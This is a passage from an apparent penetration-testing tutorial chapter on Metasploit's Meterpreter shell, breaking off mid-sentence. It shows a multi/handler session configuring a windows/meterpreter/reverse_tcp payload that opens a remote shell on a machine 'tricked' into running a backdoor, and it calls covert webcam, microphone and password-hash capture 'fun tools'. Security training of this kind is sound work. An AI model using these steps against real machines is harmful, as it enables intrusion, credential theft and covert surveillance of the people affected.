  md: '# Chapter 4 – Meterpreter Shell


    # Resources


    +   * http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient

    * http://cyberarms.wordpress.com/2013/02/03/remotely-recording-speech-and-turning-it-into-searchable-text-with-metasploit-watson/


    # Introduction


    After a successful exploit a Meterpreter shell allows you to perform many different
    functions along with a full remote shell.


    Meterpreter is for manipulating a system once you get a remote connection, so
    depending on what your goals are; a Meterpreter shell is usually preferred to
    a straight remote terminal shell.


    Meterpreter gives us a set of commands and utilities that can be run to greatly
    aid in security testing. For example, there are commands to pull the password
    hashes and gather data & settings from the system.


    There are also fun tools included in Meterpreter, for example, you can turn on
    the user’s webcam and grab still shots, you can turn on the remote microphone
    and even grab desktop screenshots of what the user is working on.


    In this section we will quickly cover the Meterpreter shell and some of its features.


    # Basic Meterpreter Commands


    Let''s start with a machine that we tricked into running a backdoored program
    (To see what we create an Anti-Virus evading backdoor see the chapter on "Veil")
    Once executed the backdoor program connected to our Kali system and a session
    was created. We were then automatically dropped into the active session as follows:


    ```

    msf > use multi/handler

    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp

    payload = windows/meterpreter/reverse_tcp

    msf exploit(handler) > set host 192.168.1.142

    192.168.1.142

    msf exploit(handler) > set lport 4000

    lport = 4000

    msf exploit(handler) > exploit


    [*] Started reverse handler on 192.168.1.142:4000

    [*] Starting the payload handler...

    [*] Sending stage (77048 bytes) to 192.168.1.132

    [*] Meterpreter session 1 opened (192.168.1.142:4000) -> 192.168.1.132:49176)
    at 2013-10-20 14:45:55 -0400

    ```


    Once connected to the session we are given a Meterpreter prompt:


    ```

    meterpreter >

    ```


    Okay, let''s see what Meterpreter can do, let''s start by using the help command
    to see what is'
